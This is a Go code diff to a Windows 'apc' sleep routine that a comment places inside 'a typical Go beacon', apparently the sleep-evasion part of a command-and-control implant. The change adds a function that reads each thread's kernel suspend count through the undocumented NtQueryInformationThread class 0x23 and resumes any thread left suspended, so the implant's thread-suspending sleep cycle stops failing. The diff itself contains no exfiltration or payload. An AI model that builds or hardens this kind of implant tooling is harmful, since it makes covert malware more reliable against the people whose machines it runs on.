@@ -66,6 +66,13 @@ const (
 	// workers or third-party threads).
 	threadQuerySetWin32StartAddress uintptr = 0x9
 
+	// NtQueryInformationThread information class returning the current
+	// kernel suspend count as a ULONG. Undocumented-but-stable; present
+	// since Windows 10 1607. Lets us READ the suspend count without
+	// perturbing it (no Suspend/Resume race introduced by the check).
+	// Buffer size = 4 bytes.
+	threadSuspendCount uintptr = 0x23
+
 	// Milliseconds to sleep between the suspend pass and the APC.
 	// SuspendThread is asynchronous; the kernel needs a moment to commit
 	// each suspension. GetThreadContext would block until commit but has
@@ -300,6 +307,101 @@ func init() {
 func mustOffset(name string, got, want uintptr) {
 	if got != want {
 		panic(fmt.Sprintf("apc: apcArgs.%s at offset 0x%X, expected 0x%X (trampoline drift)", name, got, want))
+	}
+}
+
+// healResidualSuspends is a self-healing sweep that runs at the very top
+// of every Sleep cycle. It enumerates image-based peer threads and, for
+// each one, READS the current kernel suspend count via
+// NtQueryInformationThread(ThreadSuspendCount) — a query that does NOT
+// mutate the count. If any thread has residual suspensions from prior
+// cycles (leaked by whatever race is at play in the Go-runtime /
+// Windows sysmon / our SuspendThread interaction), we drain them to
+// zero here before doing anything else.
+//
+// The critical property: this uses a QUERY, not a Suspend+Resume probe,
+// so it introduces no new race with sysmon's async preemption. It is
+// purely additive to the existing flow.
+//
+// Overhead in the steady state (no residue found): one Toolhelp
+// snapshot, one OpenThread + one NtQueryInformationThread + one
+// CloseHandle per peer. On a typical Go beacon this is 5-6 syscalls
+// per cycle — unmeasurable in practice.
+func healResidualSuspends(currentTID uint32, imageBase, imageEnd uintptr) {
+	hSnapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
+	if err != nil {
+		return
+	}
+	defer windows.CloseHandle(hSnapshot)
+
+	var te windows.ThreadEntry32
+	te.Size = uint32(unsafe.Sizeof(te))
+	if err := windows.Thread32First(hSnapshot, &te); err != nil {
+		return
+	}
+
+	currentPID := uint32(windows.GetCurrentProcessId())
+	healed := 0
+	scanned := 0
+
+	for {
+		if te.OwnerProcessID == currentPID && te.ThreadID != currentTID {
+			hThread, openErr := windows.OpenThread(
+				windows.THREAD_SUSPEND_RESUME|windows.THREAD_QUERY_INFORMATION,
+				false, te.ThreadID,
+			)
+			if openErr == nil {
+				// Filter to image-based threads (same rule as suspend pass).
+				var startAddr, retLen uintptr
+				procNtQueryInformationThread.Call(
+					uintptr(hThread),
+					threadQuerySetWin32StartAddress,
+					uintptr(unsafe.Pointer(&startAddr)),
+					unsafe.Sizeof(startAddr),
+					uintptr(unsafe.Pointer(&retLen)),
+				)
+				if startAddr >= imageBase && startAddr < imageEnd {
+					scanned++
+
+					// READ the suspend count. This does NOT change it.
+					var suspCount uint32
+					var qRetLen uintptr
+					status, _, _ := procNtQueryInformationThread.Call(
+						uintptr(hThread),
+						threadSuspendCount,
+						uintptr(unsafe.Pointer(&suspCount)),
+						unsafe.Sizeof(suspCount),
+						uintptr(unsafe.Pointer(&qRetLen)),
+					)
+
+					if status == 0 && suspCount > 0 {
+						// Residual suspension detected. Drain it.
+						drainCalls := 0
+						var lastR uintptr
+						for i := uint32(0); i < uint32(maxResumeDrain); i++ {
+							r, _, _ := procResumeThread.Call(uintptr(hThread))
+							drainCalls++
+							lastR = r
+							if r == 0 || r == 1 || r == dwordMinusOne {
+								break
+							}
+						}
+						healed++
+						dbg("heal tid=%d preSuspCount=%d drainCalls=%d lastR=%d",
+							te.ThreadID, suspCount, drainCalls, lastR)
+					}
+				}
+				windows.CloseHandle(hThread)
+			}
+		}
+
+		if err := windows.Thread32Next(hSnapshot, &te); err != nil {
+			break
+		}
+	}
+
+	if healed > 0 {
+		dbg("heal summary scanned=%d healed=%d", scanned, healed)
 	}
 }
 
@@ -552,6 +654,12 @@ func Sleep(sleepMs uint64) error {
 	// syscalls, so a suspended peer can't be holding a Go runtime lock
 	// that we then wait on.
 	imageEnd := imageBase + imageSize
+
+	// Self-heal any residual suspensions from prior cycles before we do
+	// anything else. See healResidualSuspends() docs for the theory of
+	// operation.
+	healResidualSuspends(currentTID, imageBase, imageEnd)
+
 	suspendedTIDs, err := suspendImagePeers(currentTID, imageBase, imageEnd)
 	if err != nil {
 		errorsTotal.Add(1)
